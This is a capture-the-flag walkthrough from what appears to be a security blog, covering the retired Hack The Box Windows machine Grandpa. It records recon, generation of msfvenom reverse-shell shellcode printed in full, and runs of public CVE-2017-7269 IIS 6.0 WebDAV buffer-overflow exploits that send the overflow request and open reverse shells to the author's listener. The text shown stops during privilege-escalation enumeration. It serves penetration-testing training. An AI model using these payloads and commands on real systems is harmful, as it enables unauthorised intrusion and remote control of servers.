---
title: HTB: Grandpa
url: https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html
date: 2020-05-28T12:22:34+00:00
difficulty: Easy [20]
os: Windows
tags: hackthebox, ctf, htb-grandpa, windows-2003, iis, nmap, gobuster, webdav, davtest, searchsploit, msfvenom, cve-2017-7269, explodingcan, metasploit, icacls, systeminfo, windows-exploit-suggester, seimpersonate, churrasco, htb-granny, oscp-like-v1
---

![Grandpa](https://0xdfimages.gitlab.io/img/grandpa-cover.png)

Grandpa was one of the really early HTB machines. It’s the kind of box that wouldn’t show up in HTB today, and frankly, isn’t as fun as modern targets. Still, it’s a great proxy for the kind of things that you’ll see in OSCP, and does teach some valuable lessons, especially if you try to work without Metasploit. With Metasploit, this box can probably be solved in a few minutes. Typically, the value in avoiding Metasploit comes from being able to really understand the exploits and what’s going on. In this case, it’s more about the struggle of moving files, finding binarys, etc.

## Box Info

| Name | [Grandpa](https://hackthebox.com/machines/grandpa)  [Grandpa](https://hackthebox.com/machines/grandpa) [Play on HackTheBox](https://hackthebox.com/machines/grandpa) |
| --- | --- |
| Release Date | 12 Apr 2017 |
| Retire Date | 21 Nov 2017 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Grandpa |
| Radar Graph | Radar chart for Grandpa |
| First Blood User | 04:25:06[v4l3r0n v4l3r0n](https://app.hackthebox.com/users/68) |
| First Blood Root | 04:25:34[v4l3r0n v4l3r0n](https://app.hackthebox.com/users/68) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` found only HTTP listening on TCP 80:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.14
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 15:22 EDT
Nmap scan report for 10.10.10.14
Host is up (0.015s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds

root@kali# nmap -p 80 -sC -sV -oA scans/nmap-tcpscipts 10.10.10.14
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 15:24 EDT
Nmap scan report for 10.10.10.14
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Wed, 27 May 2020 19:26:36 GMT
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the host is likely running Windows XP or Server 2003.

### Website - TCP 80

#### Site

Visiting the site, there’s just an “Under Construction” message:

![image-20200527160030648](https://0xdfimages.gitlab.io/img/image-20200527160030648.png)

#### Directory Brute Force

I’ll run `gobuster` against the site, and it finds two directories:

```

root@kali# gobuster dir -u http://10.10.10.14 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -o scans/gobuster-root-lowercasesmall
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.14
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/27 16:01:06 Starting gobuster
===============================================================
/images (Status: 301)
/_private (Status: 403)
===============================================================
2020/05/27 16:03:19 Finished
===============================================================

```

Unfortunately, I can’t find anything in `/images` and it doesn’t list contents, and I just get a 403 from `/_private`.

#### WebDAV

This reminds me a lot of [Granny](/2019/03/06/htb-granny.html#webdav), and given all the WebDAV in the `nmap` output, I ran`davtest`. Unlike in Granny, nothing is enabled:

```

root@kali# davtest -url http://10.10.10.14
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.14
********************************************************
NOTE    Random string for this session: NHwzc9ANv
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     html    FAIL
PUT     php     FAIL
PUT     txt     FAIL
PUT     jsp     FAIL
PUT     cfm     FAIL
PUT     shtml   FAIL
PUT     asp     FAIL
PUT     cgi     FAIL
PUT     aspx    FAIL
PUT     jhtml   FAIL
PUT     pl      FAIL
********************************************************
/usr/bin/davtest Summary:

```

#### Vulnerabilities

Since IIS 6.0 is so old, I decided to look for vulnerabilities, and found some:

```

root@kali# searchsploit iis 6.0
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                               | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                        | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                          | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                   | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                         | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                       | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                    | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                    | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                                                  | windows/remote/8765.php
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                       | windows/remote/19033.txt
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

## Shell as network service

### Select Vulnerability

The most interesting vulnerability in the list from `searchsploit` was `WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow`. It matches the version of Grandpa, it provides remote code execution. Also, I’ll note that the `nmap` WebDAV scan returned a bunch of info, and this is an exploit against WebDAV.

I’ll use `searchsploit -x windows/remote/41738.py` to examine the exploit code. It creates a payload that is modeled after an HTTP request, and includes shellcode to launch `calc.exe`.

Some Googling shows this is [CVE-2017-7269](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269), which has many public exploit scripts available.

### Update Shellcode - Fail

A very common thing in OSCP is finding an exploit script like this, and needing to modify it to put in your own shellcode to get a shell. I’ll use `msfvenom` to create the shellcode:

```

root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.47 LPORT=443 -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of python file: 1823 bytes
shellcode =  b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
shellcode += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shellcode += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
shellcode += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
shellcode += b"\x6a\x05\x68\x0a\x0a\x0e\x2f\x68\x02\x00\x01"
shellcode += b"\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
shellcode += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
shellcode += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
shellcode += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
shellcode += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
shellcode += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
shellcode += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
shellcode += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2"
shellcode += b"\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
shellcode += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
shellcode += b"\x6a\x00\x53\xff\xd5"

```

Now I can add that into the script. I’ll also change the target IP from 127.0.0.1 to 10.10.10.14.

This failed me:

```

root@kali# python iis6-webdav-exploit.py
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 0
If: <http://localhost/aaaaaaa￦ﾽﾨ￧ﾡﾣ￧ﾝﾡ￧ﾄﾳ￦ﾤﾶ￤ﾝﾲ￧ﾨﾹ￤ﾭﾷ￤ﾽﾰ￧ﾕﾓ￧ﾩﾏ￤ﾡﾨ￥ﾙﾣ￦ﾵﾔ￦ﾡﾅ￣ﾥﾓ￥ﾁﾬ￥ﾕﾧ￦ﾝﾣ￣ﾍﾤ￤ﾘﾰ￧ﾡﾅ￦ﾥﾒ￥ﾐﾱ￤ﾱﾘ￦ﾩﾑ￧ﾉﾁ￤ﾈﾱ￧ﾀﾵ￥ﾡﾐ￣ﾙﾤ￦ﾱﾇ￣ﾔﾹ￥ﾑﾪ￥ﾀﾴ￥ﾑﾃ￧ﾝﾒ￥ﾁﾡ￣ﾈﾲ￦ﾵﾋ￦ﾰﾴ￣ﾉﾇ￦ﾉﾁ￣ﾝﾍ￥ﾅﾡ￥ﾡﾢ￤ﾝﾳ￥ﾉﾐ￣ﾙﾰ￧ﾕﾄ￦ﾡﾪ￣ﾍﾴ￤ﾹﾊ￧ﾡﾫ￤ﾥﾶ￤ﾹﾳ￤ﾱﾪ￥ﾝﾺ￦ﾽﾱ￥ﾡﾊ￣ﾈﾰ￣ﾝﾮ￤ﾭﾉ￥ﾉﾍ￤ﾡﾣ￦ﾽﾌ￧ﾕﾖ￧ﾕﾵ￦ﾙﾯ￧ﾙﾨ￤ﾑﾍ￥ﾁﾰ￧ﾨﾶ￦ﾉﾋ￦ﾕﾗ￧ﾕﾐ￦ﾩﾲ￧ﾩﾫ￧ﾝﾢ￧ﾙﾘ￦ﾉﾈ￦ﾔﾱ￣ﾁﾔ￦ﾱﾹ￥ﾁﾊ￥ﾑﾢ￥ﾀﾳ￣ﾕﾷ￦ﾩﾷ￤ﾅﾄ￣ﾌﾴ￦ﾑﾶ￤ﾵﾆ￥ﾙﾔ￤ﾝﾬ￦ﾕﾃ￧ﾘﾲ￧ﾉﾸ￥ﾝﾩ￤ﾌﾸ￦ﾉﾲ￥ﾨﾰ￥ﾤﾸ
￥ﾑﾈ￈ﾂ￈ﾂ￡ﾋﾀ￦ﾠﾃ￦ﾱﾄ￥ﾉﾖ￤ﾬﾷ￦ﾱﾭ￤ﾽﾘ￥ﾡﾚ￧ﾥﾐ￤ﾥﾪ￥ﾡﾏ￤ﾩﾒ￤ﾅﾐ￦ﾙﾍ￡ﾏﾀ￦ﾠﾃ￤ﾠﾴ￦ﾔﾱ￦ﾽﾃ￦ﾹﾦ￧ﾑﾁ￤ﾍﾬ￡ﾏﾀ￦ﾠﾃ￥ﾍﾃ￦ﾩﾁ￧ﾁﾒ￣ﾌﾰ￥ﾡﾦ￤ﾉﾌ￧ﾁﾋ￦ﾍﾆ￥ﾅﾳ￧ﾥﾁ￧ﾩﾐ￤ﾩﾬ> (Not <locktoken:write1>) <http://localhost/bbbbbbb￧ﾥﾈ￦ﾅﾵ￤ﾽﾃ￦ﾽﾧ￦ﾭﾯ￤ﾡﾅ￣ﾙﾆ￦ﾝﾵ￤ﾐﾳ￣ﾡﾱ￥ﾝﾥ￥ﾩﾢ￥ﾐﾵ￥ﾙﾡ￦ﾥﾒ￦ﾩﾓ￥ﾅﾗ￣ﾡﾎ￥ﾥﾈ￦ﾍﾕ￤ﾥﾱ￤ﾍﾤ￦ﾑﾲ￣ﾑﾨ￤ﾝﾘ￧ﾅﾹ￣ﾍﾫ￦ﾭﾕ￦ﾵﾈ￥ﾁﾏ￧ﾩﾆ￣ﾑﾱ￦ﾽﾔ￧ﾑﾃ￥ﾥﾖ￦ﾽﾯ￧ﾍﾁ￣ﾑﾗ￦ﾅﾨ￧ﾩﾲ￣ﾝﾅ￤ﾵﾉ￥ﾝﾎ￥ﾑﾈ￤ﾰﾸ￣ﾙﾺ￣ﾕﾲ￦ﾉﾦ￦ﾹﾃ￤ﾡﾭ￣ﾕﾈ￦ﾅﾷ￤ﾵﾚ￦ﾅﾴ￤ﾄﾳ
￤ﾍﾥ￥ﾉﾲ￦ﾵﾩ￣ﾙﾱ￤ﾹﾤ￦ﾸﾹ￦ﾍﾓ￦ﾭﾤ￥ﾅﾆ￤ﾼﾰ￧ﾡﾯ￧ﾉﾓ￦ﾝﾐ￤ﾕﾓ￧ﾩﾣ￧ﾄﾹ￤ﾽﾓ￤ﾑﾖ￦ﾼﾶ￧ﾍﾹ￦ﾡﾷ￧ﾩﾖ￦ﾅﾊ￣ﾥﾅ￣ﾘﾹ￦ﾰﾹ￤ﾔﾱ￣ﾑﾲ￥ﾍﾥ￥ﾡﾊ￤ﾑﾎ￧ﾩﾄ￦ﾰﾵ￥ﾩﾖ￦ﾉﾁ￦ﾹﾲ￦ﾘﾱ￥ﾥﾙ￥ﾐﾳ￣ﾅﾂ￥ﾡﾥ￥ﾥﾁ￧ﾅﾐ￣ﾀﾶ￥ﾝﾷ￤ﾑﾗ￥ﾍﾡ￡ﾏﾀ￦ﾠﾃ￦ﾹﾏ￦ﾠﾀ￦ﾹﾏ￦ﾠﾀ￤ﾉﾇ￧ﾙﾪ￡ﾏﾀ￦ﾠﾃ￤ﾉﾗ￤ﾽﾴ￥ﾥﾇ￥ﾈﾴ￤ﾭﾦ￤ﾭﾂ￧ﾑﾤ￧ﾡﾯ￦ﾂﾂ￦ﾠﾁ￥ﾄﾵ￧ﾉﾺ￧ﾑﾺ￤ﾵﾇ￤ﾑﾙ￥ﾝﾗ￫ﾄﾓ￦ﾠﾀ￣ﾅﾶ￦ﾹﾯ￢ﾓﾣ￦ﾠﾁ￡ﾑﾠ￦ﾠﾃ￧﾿ﾾ￯﾿﾿￯﾿﾿￡ﾏﾀ￦ﾠﾃ￑ﾮ￦ﾠﾃ￧ﾅﾮ￧ﾑﾰ￡ﾐﾴ￦ﾠﾃ￢ﾧﾧ￦ﾠﾁ￩ﾎﾑ￦ﾠﾀ￣ﾤﾱ￦ﾙﾮ￤ﾥﾕ￣ﾁﾒ￥ﾑﾫ￧ﾙﾫ￧ﾉﾊ￧ﾥﾡ￡ﾐﾜ￦ﾠﾃ￦ﾸﾅ￦ﾠﾀ￧ﾜﾲ￧ﾥﾨ￤ﾵﾩ￣ﾙﾬ￤ﾑﾨ￤ﾵﾰ￨ﾉﾆ￦ﾠﾀ￤ﾡﾷ￣ﾉﾓ￡ﾶﾪ￦ﾠﾂ￦ﾽﾪ￤ﾌﾵ￡ﾏﾸ￦ﾠﾃ
￢ﾧﾧ￦ﾠﾁ`1dP0R
8u};}$uXX$fￓﾋI:I41|,
KXￓﾋ￐ﾉD$$[[aYZQ__Z]h32hws2_ThLw&ￕﾸ)TPh)kPPPP@P@Phￕﾗjh
/hjVWhtaￕﾅt
          uhVhcmdWWW1jYVfD$<D$DTPVVVFVNVVSVhy?ￕﾉNVF0`ￕﾻVh<|
uGrojS>

HTTP/1.1 400 Bad Request
Content-Type: text/html
Date: Wed, 27 May 2020 20:19:05 GMT
Connection: close
Content-Length: 20

<h1>Bad Request</h1>  

```

In doing some reading, it seems that this exploit requires some specifics things about the shellcode, which led me to the next attempt.

### ExplodingCan - Kinda Fail

The nicest script I found is [this one](https://github.com/danigargu/explodingcan), which runs with a target url and a shellscript file. I created shellcode the same way as in the example:

```

root@kali# msfvenom -p windows/shell_reverse_tcp -f raw -e x86/alpha_mixed LHOST=10.10.14.47 LPORT=443 > shellcode_rev_10.10.14.47_443
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 710 (iteration=0)
x86/alpha_mixed chosen with final size 710
Payload size: 710 bytes

```

Now I can run the exploit:

```

root@kali# python explodingcan.py http://10.10.10.14 shellcode_rev_10.10.14.47_443
[*] Using URL: http://10.10.10.14
[*] Server found: Microsoft-IIS/6.0
[*] Found IIS path size: 18
[*] Default IIS path: C:\Inetpub\wwwroot
[*] WebDAV request: OK
[*] Payload len: 2190
[*] Sending payload...

```

I get a connection at `nc`, but it immediately dies:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.14.
Ncat: Connection from 10.10.10.14:1037.

```

I did some experimenting, and the Meterpreter payload works fine:

```

root@kali# msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/alpha_mixed LHOST=10.10.14.47 LPORT=443 > shellcode_msf_10.10.14.47_443
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 744 (iteration=0)
x86/alpha_mixed chosen with final size 744
Payload size: 744 bytes    

```

Running it now results in:

```

msf5 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.47:443 
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.47:443 -> 10.10.10.14:1034) at 2020-05-27 16:54:40 -0400

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE

```

But even switching to a staged shell and catching it in `msfconsole` resulted in the same behavior, death instantly:

```

msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.47:443 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.14
[*] Command shell session 3 opened (10.10.14.47:443 -> 10.10.10.14:1038) at 2020-05-27 17:15:40 -0400

[*] 10.10.10.14 - Command shell session 3 closed.  Reason: User exit

```

Eventually I did some Googling and stumbled across [this post](https://forum.hackthebox.eu/discussion/1990/grandpa-reverse-tcp-immediately-closes-after-sending-exploit/p1) in the HTB forums, which is others having the same issue. I have no idea why.

### Success

I eventually found [this script](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269). I didn’t have to update it at all, and running it gave a shell:

```

root@kali# python iis_rev_shell.py 10.10.10.14 80 10.10.14.47 443
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa￦ﾽﾨ￧ﾡﾣ￧ﾝﾡ￧ﾄﾳ￦ﾤﾶ￤ﾝﾲ￧ﾨﾹ￤ﾭﾷ￤ﾽﾰ￧ﾕﾓ￧ﾩﾏ￤ﾡﾨ￥ﾙﾣ￦ﾵﾔ￦ﾡﾅ￣ﾥﾓ￥ﾁﾬ￥ﾕﾧ￦ﾝﾣ￣ﾍﾤ￤ﾘﾰ￧ﾡﾅ￦ﾥﾒ￥ﾐﾱ￤ﾱﾘ￦ﾩﾑ￧ﾉﾁ￤ﾈﾱ￧ﾀﾵ￥ﾡﾐ￣ﾙﾤ￦ﾱﾇ￣ﾔﾹ￥ﾑﾪ￥ﾀﾴ￥ﾑﾃ￧ﾝﾒ￥ﾁﾡ￣ﾈﾲ￦ﾵﾋ￦ﾰﾴ￣ﾉﾇ￦ﾉﾁ￣ﾝﾍ￥ﾅﾡ￥ﾡﾢ￤ﾝﾳ￥ﾉﾐ￣ﾙﾰ￧ﾕﾄ￦ﾡﾪ￣ﾍﾴ￤ﾹﾊ￧ﾡﾫ￤ﾥﾶ￤ﾹﾳ￤ﾱﾪ￥ﾝﾺ￦ﾽﾱ￥ﾡﾊ￣ﾈﾰ￣ﾝﾮ￤ﾭﾉ￥ﾉﾍ￤ﾡﾣ￦ﾽﾌ￧ﾕﾖ￧ﾕﾵ￦ﾙﾯ￧ﾙﾨ￤ﾑﾍ￥ﾁﾰ￧ﾨﾶ￦ﾉﾋ￦ﾕﾗ￧ﾕﾐ￦ﾩﾲ￧ﾩﾫ￧ﾝﾢ￧ﾙﾘ￦ﾉﾈ￦ﾔﾱ￣ﾁﾔ￦ﾱﾹ￥ﾁﾊ￥ﾑﾢ￥ﾀﾳ￣ﾕﾷ￦ﾩﾷ￤ﾅﾄ￣ﾌﾴ￦ﾑﾶ￤ﾵﾆ￥ﾙﾔ￤ﾝﾬ￦ﾕﾃ￧ﾘﾲ￧ﾉﾸ￥ﾝﾩ￤ﾌﾸ￦ﾉﾲ￥ﾨﾰ￥ﾤﾸ
￥ﾑﾈ￈ﾂ￈ﾂ￡ﾋﾀ￦ﾠﾃ￦ﾱﾄ￥ﾉﾖ￤ﾬﾷ￦ﾱﾭ￤ﾽﾘ￥ﾡﾚ￧ﾥﾐ￤ﾥﾪ￥ﾡﾏ￤ﾩﾒ￤ﾅﾐ￦ﾙﾍ￡ﾏﾀ￦ﾠﾃ￤ﾠﾴ￦ﾔﾱ￦ﾽﾃ￦ﾹﾦ￧ﾑﾁ￤ﾍﾬ￡ﾏﾀ￦ﾠﾃ￥ﾍﾃ￦ﾩﾁ￧ﾁﾒ￣ﾌﾰ￥ﾡﾦ￤ﾉﾌ￧ﾁﾋ￦ﾍﾆ￥ﾅﾳ￧ﾥﾁ￧ﾩﾐ￤ﾩﾬ> (Not <locktoken:write1>) <http://localhost/bbbbbbb￧ﾥﾈ￦ﾅﾵ￤ﾽﾃ￦ﾽﾧ￦ﾭﾯ￤ﾡﾅ￣ﾙﾆ￦ﾝﾵ￤ﾐﾳ￣ﾡﾱ￥ﾝﾥ￥ﾩﾢ￥ﾐﾵ￥ﾙﾡ￦ﾥﾒ￦ﾩﾓ￥ﾅﾗ￣ﾡﾎ￥ﾥﾈ￦ﾍﾕ￤ﾥﾱ￤ﾍﾤ￦ﾑﾲ￣ﾑﾨ￤ﾝﾘ￧ﾅﾹ￣ﾍﾫ￦ﾭﾕ￦ﾵﾈ￥ﾁﾏ￧ﾩﾆ￣ﾑﾱ￦ﾽﾔ￧ﾑﾃ￥ﾥﾖ￦ﾽﾯ￧ﾍﾁ￣ﾑﾗ￦ﾅﾨ￧ﾩﾲ￣ﾝﾅ￤ﾵﾉ￥ﾝﾎ￥ﾑﾈ￤ﾰﾸ￣ﾙﾺ￣ﾕﾲ￦ﾉﾦ￦ﾹﾃ￤ﾡﾭ￣ﾕﾈ￦ﾅﾷ￤ﾵﾚ￦ﾅﾴ￤ﾄﾳ
￤ﾍﾥ￥ﾉﾲ￦ﾵﾩ￣ﾙﾱ￤ﾹﾤ￦ﾸﾹ￦ﾍﾓ￦ﾭﾤ￥ﾅﾆ￤ﾼﾰ￧ﾡﾯ￧ﾉﾓ￦ﾝﾐ￤ﾕﾓ￧ﾩﾣ￧ﾄﾹ￤ﾽﾓ￤ﾑﾖ￦ﾼﾶ￧ﾍﾹ￦ﾡﾷ￧ﾩﾖ￦ﾅﾊ￣ﾥﾅ￣ﾘﾹ￦ﾰﾹ￤ﾔﾱ￣ﾑﾲ￥ﾍﾥ￥ﾡﾊ￤ﾑﾎ￧ﾩﾄ￦ﾰﾵ￥ﾩﾖ￦ﾉﾁ￦ﾹﾲ￦ﾘﾱ￥ﾥﾙ￥ﾐﾳ￣ﾅﾂ￥ﾡﾥ￥ﾥﾁ￧ﾅﾐ￣ﾀﾶ￥ﾝﾷ￤ﾑﾗ￥ﾍﾡ￡ﾏﾀ￦ﾠﾃ￦ﾹﾏ￦ﾠﾀ￦ﾹﾏ￦ﾠﾀ￤ﾉﾇ￧ﾙﾪ￡ﾏﾀ￦ﾠﾃ￤ﾉﾗ￤ﾽﾴ￥ﾥﾇ￥ﾈﾴ￤ﾭﾦ￤ﾭﾂ￧ﾑﾤ￧ﾡﾯ￦ﾂﾂ￦ﾠﾁ￥ﾄﾵ￧ﾉﾺ￧ﾑﾺ￤ﾵﾇ￤ﾑﾙ￥ﾝﾗ￫ﾄﾓ￦ﾠﾀ￣ﾅﾶ￦ﾹﾯ￢ﾓﾣ￦ﾠﾁ￡ﾑﾠ￦ﾠﾃ￧﾿ﾾ￯﾿﾿￯﾿﾿￡ﾏﾀ￦ﾠﾃ￑ﾮ￦ﾠﾃ￧ﾅﾮ￧ﾑﾰ￡ﾐﾴ￦ﾠﾃ￢ﾧﾧ￦ﾠﾁ￩ﾎﾑ￦ﾠﾀ￣ﾤﾱ￦ﾙﾮ￤ﾥﾕ￣ﾁﾒ￥ﾑﾫ￧ﾙﾫ￧ﾉﾊ￧ﾥﾡ￡ﾐﾜ￦ﾠﾃ￦ﾸﾅ￦ﾠﾀ￧ﾜﾲ￧ﾥﾨ￤ﾵﾩ￣ﾙﾬ￤ﾑﾨ￤ﾵﾰ￨ﾉﾆ￦ﾠﾀ￤ﾡﾷ￣ﾉﾓ￡ﾶﾪ￦ﾠﾂ￦ﾽﾪ￤ﾌﾵ￡ﾏﾸ￦ﾠﾃ
￢ﾧﾧ￦ﾠﾁVVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>

```

At my listener:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.14.
Ncat: Connection from 10.10.10.14:1030.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
nt authority\network service

```

Sometimes this script too would fail, if the box wasn’t in a clean start. When doing buffer overflow exploits, it’s a good idea to start from a clean state if possible (ie reset the box).

### No user.txt

Interestingly, I didn’t have access to `user.txt` at this point. There was one user, Harry:

```

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings

04/12/2017  05:32 PM    <DIR>          .
04/12/2017  05:32 PM    <DIR>          ..
04/12/2017  05:12 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          All Users
04/12/2017  05:32 PM    <DIR>          Harry
               0 File(s)              0 bytes
               5 Dir(s)  18,090,201,088 bytes free

```

I did not have access:

```

C:\Documents and Settings>cd harry
Access is denied.

C:\Documents and Settings>type harry\desktop\user.txt
Access is denied.

```

After rooting the box, I looked at some writeups - none, including the official HTB write-up and Ippsec, pivoted to Harry before going to root. I guess this was the intended path. HTB doesn’t have root times for this box, but there are more system owns than user owns.

## Priv: network service –> system

### Enumeration

#### Finding a Location

To run any exploits, I’ll need a place I can write on Grandpa. Many of my go-tos failed:

```

C:\WINDOWS\system32\spool\drivers\color>echo test > test.txt
Access is denied.

```

In the system root, there’s an unusual directory, `wmpub`:

```

C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\

04/12/2017  05:27 PM    <DIR>          ADFS
04/12/2017  05:04 PM                 0 AUTOEXEC.BAT
04/12/2017  05:04 PM                 0 CONFIG.SYS
04/12/2017  05:32 PM    <DIR>          Documents and Settings
04/12/2017  05:17 PM    <DIR>          FPSE_search
04/12/2017  05:17 PM    <DIR>          Inetpub
12/24/2017  08:18 PM    <DIR>          Program Files
12/24/2017  08:27 PM    <DIR>          WINDOWS
05/28/2020  02:41 PM    <DIR>          wmpub
               2 File(s)              0 bytes
